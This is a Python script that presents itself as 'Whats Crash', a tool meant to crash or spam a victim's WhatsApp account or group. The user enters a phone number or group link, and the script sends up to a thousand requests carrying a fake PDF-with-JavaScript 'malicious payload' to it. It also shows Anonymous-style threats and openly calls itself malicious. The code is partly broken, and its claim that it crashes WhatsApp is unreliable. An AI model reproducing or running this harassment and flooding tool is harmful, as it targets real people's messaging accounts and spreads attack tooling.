import os, sys, time, json
from socket import *
import phonenumbers

try:
    import requests
    import urllib
except:
    os.system("pip install requests urllib")

ipaddr = gethostbyname(gethostname())
max_data = (((707+111+1011)*3)-1396)+5 #4096

white="\033[0m"
bg="\033[49m"
red="\033[91;1m"
blue="\033[94;1m"
green="\033[92;1m"
purple="\033[95;1m"

def slow(F3):
    for a in F3 + '\n':sys.stdout.write(a),sys.stdout.flush(),time.sleep(1./300)



def internet():
    try:
        s = socket(AF_NET, SOCK_STREAM)
        s.connect_ex(("www.google.com",80))
        return True
    except Exception:return False

def aboutus():
    slow("    Tool Name: Whats Crash")
    slow("    Version: v[1.0]")
    slow("    Author: evilfeonix")
    slow("    Github: EVil FeoniX")
    slow("    Youtube: EVil FeoniX")
    slow("    Update: 26 - JAN - 2025")
    slow(f"==========================================================={white}")


def banner():
    os.system("cls || clear")
    slow(f"""{red}
 _      _  _           _           ____               _     
| |    | || |__   __ _| |_ ___    / ___|_ __ __ _ ___| |__  
| | /\ | || '_ \ / _` | __/ __|  | |   | '__/ _` / __| '_ \ 
| |/  \| || | | | (_| | |_\__ \  | |___| | | (_| \__ \ | | |
\___/\___/|_| |_|\__,_|\__|___/   \____|_|  \__,_|___/_| |_|
===========================================================""")


def set_malicious_payload(user):
    user_payload = f"‎‏\n\tattacker's message: {user}\n\t‎‏\n\tattacke's ip: {ipaddr}\n\twhatsapp crasher, created by ëvĩʟ-fɘōɳĭx 😈☠😈" if user else ""

    data = {
        "attacker": f"{user_payload}",
        "ëvĩʟ-fɘōɳĭx": """HAHAHA!.\n\twe are 🎭 anonymous,\n\twe represent freedom,\n\twe oppose oppression,\n\twe are simply an evolution 🧬 of the technology system 👨🏾‍💻,\n\twhere liberty 🗽 is at risk,\n\texpect us 👥.

    ======================================================================================
        ‎‏         >> ëvĩʟ-fɘōɳĭx 😈☠😈  <<      ‎‏ 
    ‎‏      >> whatsapp virus by ëvĩʟ-fɘōɳĭx  <<      ‎‏
    ‎‏ >> https://github.com/evilfeonix/Whats-Crasher << ‎‏ 
    ‎‏ >> Whats-Crasher by ëvĩʟ-fɘōɳĭx hacker 😈☠😈 << ‎‏ 
    ======================================================================================
        """,
        "malicious-payload": """
    %PAYLOAD - 1.4
    %����
    1 0 obj
    <<
    /Type /Pages
    /Count: acountable
    /Kids [ 5 0 R 98 0 R 109 0 R 125 0 R 134 0 R 156 0 R 164 0 R 181 0 R 183 0 R 186 0 R 193 0 R 195 0 R 198 0 R 200 0 R 203 0 R 205 0 R 207 0 R 209 0 R 212 0 R 214 0 R 216 0 R 219 0 R 221 0 R 223 0 R 225 0 R 228 0 R 230 0 R 232 0 R 234 0 R 236 0 R 238 0 R 242 0 R 245 0 R 247 0 R 249 0 R 251 0 R 253 0 R 258 0 R 260 0 R 262 0 R 264 0 R 266 0 R 268 0 R 270 0 R 272 0 R 274 0 R 276 0 R 278 0 R 280 0 R 282 0 R 284 0 R 286 0 R 288 0 R 290 0 R 294 0 R 296 0 R 298 0 R 302 0 R 304 0 R 306 0 R 308 0 R 310 0 R 312 0 R 314 0 R 316 0 R 318 0 R 320 0 R 322 0 R 324 0 R 326 0 R 328 0 R 330 0 R 332 0 R 334 0 R 336 0 R 338 0 R 340 0 R 342 0 R 344 0 R 346 0 R 348 0 R 350 0 R 352 0 R 356 0 R 360 0 R 362 0 R 364 0 R 381 0 R 383 0 R 385 0 R 387 0 R 389 0 R 391 0 R 395 0 R 400 0 R 403 0 R 418 0 R 609 0 R 643 0 R 686 0 R ]
    >>
    endobj
    2 0 obj
    <<
    /Title (Whatsapp\055Crasher)
    /Author (coded\040by\040evilfeonix)
    >>
    endobj
    3 0 obj
    <<
    /Type /Catalog
    /Pages 1 0 R
    /Names <<
    /JavaScript <<
    /Names [ (bae1dfad\055702c\0554486\055ad90\0554963f37d45ec) 4 0 R ]
    ???
    ???
    ???
    endobj
    4 0 obj
    <<
    /Type /Action
    /S /JavaScript
    /JS (app\056alert\050\042evil\055feonix\040whatsapp-warm\042\051\073\012app\056alert\050\042al\055feonix\040whatsapp-warm1\042\051\073\012app\056alert\050\042al\055feonix\040whatsapp-warm2\042\051\073)
    >>
    endobj
    5 0 obj
    <<
    /Type /Page
    /Resources <<
    /ProcSet [ /PDF /Text /ImageB /ImageC /ImageI ]
    /ExtGState <<
    /G3 6 0 R
    ‎‏
    ‎‏
    >>
    /XObject <<
    /X5 8 0 R
    /X10 10 0 R
    >>
    /MediaBox [ 0 0 612 792 ]
    /Annots [ 85 0 R 86 0 R 87 0 R 88 0 R 89 0 R 90 0 R 91 0 R 92 0 R 93 0 R 94 0 R 95 0 R 96 0 R ]
    /Contents 97 0 R
    /Parent 1 0 R
    >>
    endobj
    6 0 obj
    <<
    /ca 1
    /BM /Normal
    >>
    endobj
    8 0 obj
    
    
    
    
    
    ������������
    ��������������
    ����������������
    <<
    /Type /XObject
    /Subtype /Image
    /Width 100
    /Height 97
    /ColorSpace [ /ICCBased 9 0 R ]
    /BitsPerComponent 8
    /Filter /DCTDecode
    /ColorTransform 0
    /Length 3311
    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
    >>    https://www.evilfeonix.com      <<
            www.evilfeonix@gmail.com  
        """
    }

    
    max_data_size = max_data
    data_size = len(json.dumps(data).encode("utf-8"))
    
    data["Hacker"] = f"""  attacker's ip: {ipaddr}...
    ======================================================================================
            ‎‏         >> ëvĩʟ-fɘōɳĭx 😈☠😈  <<      ‎‏ 
        ‎‏      >> whatsapp virus by ëvĩʟ-fɘōɳĭx  <<      ‎‏
        ‎‏ >> https://github.com/evilfeonix/Whats-Crasher << ‎‏ 
        ‎‏ >> Whats-Crasher by ëvĩʟ-fɘōɳĭx hacker 😈☠😈 << ‎‏ 
    ======================================================================================"""
    data["Hacker1"] = f"""  attacker's ip: {ipaddr}...
    ======================================================================================
            ‎‏         >> ëvĩʟ-fɘōɳĭx 😈☠😈  <<      ‎‏ 
        ‎‏      >> whatsapp virus by ëvĩʟ-fɘōɳĭx  <<      ‎‏
        ‎‏ >> https://github.com/evilfeonix/Whats-Crasher << ‎‏ 
        ‎‏ >> Whats-Crasher by ëvĩʟ-fɘōɳĭx hacker 😈☠😈 << ‎‏ 
    ======================================================================================"""
    data["Hacker2"] = f"""  attacker's ip: {ipaddr}...
    ======================================================================================
            ‎‏         >> ëvĩʟ-fɘōɳĭx 😈☠😈  <<      ‎‏ 
        ‎‏      >> whatsapp virus by ëvĩʟ-fɘōɳĭx  <<      ‎‏
        ‎‏ >> https://github.com/evilfeonix/Whats-Crasher << ‎‏ 
        ‎‏ >> Whats-Crasher by ëvĩʟ-fɘōɳĭx hacker 😈☠😈 << ‎‏ 
    ======================================================================================"""
    data["Hacker3"] = f"""  attacker's ip: {ipaddr}...   
    ======================================================================================
            ‎‏         >> ëvĩʟ-fɘōɳĭx 😈☠😈  <<      ‎‏ 
        ‎‏      >> whatsapp virus by ëvĩʟ-fɘōɳĭx  <<      ‎‏
        ‎‏ >> https://github.com/evilfeonix/Whats-Crasher << ‎‏ 
        ‎‏ >> Whats-Crasher by ëvĩʟ-fɘōɳĭx hacker 😈☠😈 << ‎‏ 
    ======================================================================================"""
    data["Hacker4"] = f"""  attacker's ip: {ipaddr}...
    ======================================================================================
            ‎‏         >> ëvĩʟ-fɘōɳĭx 😈☠😈  <<      ‎‏ 
        ‎‏      >> whatsapp virus by ëvĩʟ-fɘōɳĭx  <<      ‎‏
        ‎‏ >> https://github.com/evilfeonix/Whats-Crasher << ‎‏ 
        ‎‏ >> Whats-Crasher by ëvĩʟ-fɘōɳĭx hacker 😈☠😈 << ‎‏ 
    ======================================================================================"""

    return data


def start_attack(msg,victim):
    payload = set_malicious_payload(msg)

    worm = {"text":json.dumps(payload),"data":json.dumps(payload)}

    if victim[0] == '+':
        data = urllib.parse.urlencode(worm)
        url = f"https://wa.me/{victim}?{data}"

    else:
        data = urllib.parse.urlencode(worm)
        url = f"{victim}?{data}"
    
    
    try:response = requests.get(url)
    except requests.exceptions.ConnectionError:
        slow(f"{red}[-] Please Check Your Internet Connection.{white}")
        os.sys.exit()

    if response.status_code == 200:
        os.system("clear || cls")
        return True
    else:
        return False
        
        

def multipro(victim):
    i=0
    j=0
    msg = input("[+] Enter message to send: ")
    try:
        for k in range(1000):
            a = start_attack(msg,victim)
            if a == True:
                i+=1
                print(f"{bg}{red}Press Ctr+C to stop Attacks\033[0m{red}",end='\r')
            else:
                j+=1

    except KeyboardInterrupt:
        slow(f"{red}[-] Attack Stopped!{white}              ")
        time.sleep(3)

    os.system('clear || cls')
    slow(f"""{red}
 _      _  _           _           ____               _     
| |    | || |__   __ _| |_ ___    / ___|_ __ __ _ ___| |__  
| | /\ | || '_ \ / _` | __/ __|  | |   | '__/ _` / __| '_ \ 
| |/  \| || | | | (_| | |_\__ \  | |___| | | (_| \__ \ | | |
\___/\___/|_| |_|\__,_|\__|___/   \____|_|  \__,_|___/_| |_|
===========================================================
    HAHAHA!. 💀☠💀               
    we are 🎭 anonymous 🤬,   
    we do not forgive 👿,  
    we do not forget 😈,
    expect us 👥 any time 👀.{red}
===========================================================
    Status: OK        
    Status_Code: 200        
    Victim: {victim}        
    Sent: {i}        
    Failed: {j}        
        {bg}{red}Subscribe To Our Youtube Channel\033[0m{red}
==========================================================={white}
            """)
def pro(victim):
    i=0
    j=0
    k=0
    msg = input("[+] Enter message to send: ")
    a = start_attack(msg,victim)
    if a == True:
        i+=1
        slow(f"""{red}
 _      _  _           _           ____               _     
| |    | || |__   __ _| |_ ___    / ___|_ __ __ _ ___| |__  
| | /\ | || '_ \ / _` | __/ __|  | |   | '__/ _` / __| '_ \ 
| |/  \| || | | | (_| | |_\__ \  | |___| | | (_| \__ \ | | |
\___/\___/|_| |_|\__,_|\__|___/   \____|_|  \__,_|___/_| |_|
===========================================================
    HAHAHA!. 💀☠💀               
    we are 🎭 anonymous 🤬,   
    we do not forgive 👿,  
    we do not forget 😈,
    expect us 👥 any time 👀.{red}
===========================================================
    Status: OK        
    Status_Code: 200        
    Victim: {victim}        
    Sent: {i}        
    Failed: {j}        
        {bg}{red}Subscribe To Our Youtube Channel\033[0m{red}
==========================================================={white}
            """)
    else:
            j+=1
    
    
def main():
    banner()
    slow("    HAHAHA!.               ")
    slow("    we are 🎭 anonymous,   ")
    slow("    we represent freedom,  ")
    slow("    we oppose oppression,  ")
    slow("    we are simply an evolution 🧬 of the technology system 👨🏾‍💻, ")
    slow("    where liberty 🗽 is at risk, ")
    slow("    expect us 👥.               ")
    slow("===========================================================")
    input("Press Enter to Continue...")

    banner()
    slow("    Welcome to WhatsApp Crasher!, ")
    slow("    Where you can easily crash victim's whatsapp with one click")
    slow("    Feel free to used this tool maliciously but respectively")
    slow("    Becouse, this tool was created and intented for malicious purpose")
    slow("    Note that we as the creators are not responsible for all damages couses by this tool")
    slow("    LET ACT WICKED AND CRASHES THERE WHATSAPP... ")
    slow("===========================================================")
    input("Press Enter to Continue...")

    banner()
    slow("                         ")
    slow("    [01] Exit This Tool ")
    slow("    [02] About This Tool ")
    slow("    [03] Crash WhatsApp User ")
    slow("    [04] Crash WhatsApp Group/Channel ")
    slow("    [05] Send Red Flag to WhatsApp User ")
    slow("    [06] Send Red Flag to WhatsApp Group/Channel ")
    ec = input("    \n[Enter Choice]>> ")

    if ec in ['01','1']:
        slow(f'{red}[-] Thanks for using this tool\nFollow us on github for more...{white}\n')
    elif ec in ['02','2']:
        os.system("clear || cls")
        banner()
        aboutus()
    elif ec in ['03','3']:
        os.system("clear || cls")
        banner()
        cncode = input('[+] Enter Victims Country Code withOut "+" eg.234: ')
        number = input("[+] Enter Victims Phone Number: ")
        num = f"+{cncode}{number}"
        multipro(num)
    elif ec in ['04','4']:
        os.system("clear || cls")
        banner()
        url = input('[+] Copy and Paste Group/Channel URL Here: ')
        multipro(url)
    elif ec in ['05','5']:
        os.system("clear || cls")
        banner()
        cncode = input('[+] Enter Victims Country Code withOut "+" eg.234: ')
        number = input("[+] Enter Victims Phone Number: ")
        num = f"+{cncode}{number}"
        pro(num)
    elif ec in ['06','6']:
        os.system("clear || cls")
        banner()
        url = input('[+] Copy and Paste Group/Channel URL Here : ')
        pro(url)
    else:
        slow(f'{red}[-] Invalid Choice...{white}\n')
        os.sys.exit()
    
    
main()  
